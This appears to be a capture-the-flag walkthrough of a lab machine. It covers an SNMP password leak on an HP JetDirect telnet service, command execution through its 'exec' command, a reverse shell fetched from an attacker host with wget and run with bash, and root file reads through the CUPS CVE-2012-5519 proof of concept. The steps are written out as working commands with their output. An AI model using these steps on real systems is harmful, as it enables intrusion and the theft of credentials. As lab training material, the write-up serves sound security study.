IP: 10.129.52.212
Website: **None**
## Scan & Eval (Round 1)
#### NMAP Initial Scan
```
Nmap scan report for 10.129.52.212
Host is up, received conn-refused (0.045s latency).
Scanned at 2024-07-26 03:13:56 MDT for 0s

PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.61 seconds
```
## Info Gathering (Round 1)
#### Telnet Port 23
- Upon connection you are greeted with the following
```
Trying 10.129.52.212...
Connected to 10.129.52.212.
Escape character is '^]'.

HP JetDirect

Password: 
```

## Exploitation (Round 1)
#### HP JetDirect
- HP JetDirect has a vulnerability that exposes its password via SNMP
	- Running the following command against the target returns raw bytes
```
❯ snmpget -v 1 -c public 10.129.52.212 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```
- Converting the bytes to ASCII reveals the password is `P@ssw0rd@123!!123`
	- Utilizing this password we gain access to the telnet interface
```
Trying 10.129.52.212...
Connected to 10.129.52.212.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
> 
```
- We can utilize the `exec` command to run commands
```
> exec uname -a
Linux antique 5.13.0-051300-generic #202106272333 SMP Sun Jun 27 23:36:43 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
> exec whoami
lp
```
- Crafted a basic `shell.sh` reverse shell and downloaded to the target then ran it to gain a reverse shell.
```
> exec wget http://10.10.14.35:8000/shell.sh
> exec chmod 777 shell.sh
> exec /bin/bash shell.sh
```
## Info Gathering (Round 2)
#### telnet.py File
- This file appears to be the python file of the telnet interface we logged in to.
#### Linpeas.sh
- Linpeas reports that there is a service on port `631` which is normally used my `cups`
```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1165/python3        
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
```
- Running `curl http://127.0.0.1:631` reveals that it is running CUPS 1.6.1
	- This version of CUPS has a vulnerability that allows `lpadmin` to change `cupsd.conf` and redirect the error log page `http://127.0.0.1:631/admin/log/error_log` page to any file and read it out with root permissions. [CVE-2012-5519](https://github.com/p1ckzi/CVE-2012-5519)
```
curl http://127.0.0.1:631
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3792  100  3792    0     0  1851k      0 --:--:-- --:--:-- --:--:-- 1851k
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
	<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
	<TITLE>Home - CUPS 1.6.1</TITLE>
	<LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
	<LINK REL="SHORTCUT ICON" HREF="/images/cups-icon.png" TYPE="image/png">
</HEAD>
...
```

## Exploitation (Round 2)

- Utilizing the PoC `cups-root-file-read.sh` with command `echo '/root/root.txt' | ./cups-root-file-read.sh` the contents of `/root/root.txt` can be read.
```
                                            _
  ___ _   _ _ __  ___       _ __ ___   ___ | |_
 / __| | | | '_ \/ __|_____| '__/ _ \ / _ \| __|____
| (__| |_| | |_) \__ \_____| | | (_) | (_) | ||_____|
 \___|\__,_| .__/|___/     |_|  \___/ \___/ \__|
 / _(_) | _|_|      _ __ ___  __ _  __| |  ___| |__
| |_| | |/ _ \_____| '__/ _ \/ _` |/ _` | / __| '_ \ 
|  _| | |  __/_____| | |  __/ (_| | (_| |_\__ \ | | |
|_| |_|_|\___|     |_|  \___|\__,_|\__,_(_)___/_| |_|
a bash implementation of CVE-2012-5519 for linux.

[i] performing checks...
[i] checking for cupsctl command...
[+] cupsctl binary found in path.
[i] checking cups version...
[+] using cups 1.6.1. version may be vulnerable.
[i] checking user lp in lpadmin group...
[+] user part of lpadmin group.
[i] checking for curl command...
[+] curl binary found in path.
[+] all checks passed.

[!] warning!: this script will set the group ownership of
[!] viewed files to user 'lp'.
[!] files will be created as root and with group ownership of
[!] user 'lp' if a nonexistant file is submitted.
[!] changes will be made to /etc/cups/cups.conf file as part of the
[!] exploit. it may be wise to backup this file or copy its contents
[!] before running the script any further if this is a production
[!] environment and/or seek permissions beforehand.
[!] the nature of this exploit is messy even if you know what you're looking for.

[i] usage:
	input must be an absolute path to an existing file.
	eg.
	1. /root/.ssh/id_rsa
	2. /root/.bash_history
	3. /etc/shadow
	4. /etc/sudoers ... etc.
[i] ./cups-root-file-read.sh commands:
	type 'info' for exploit details.
	type 'help' for this dialog text.
	type 'quit' to exit the script.
[i] for more information on the limitations
[i] of the script and exploit, please visit:
[i] https://github.com/0zvxr/CVE-2012-5519/blob/main/README.md
[>] [+] contents of /root/root.txt:
```

# Complete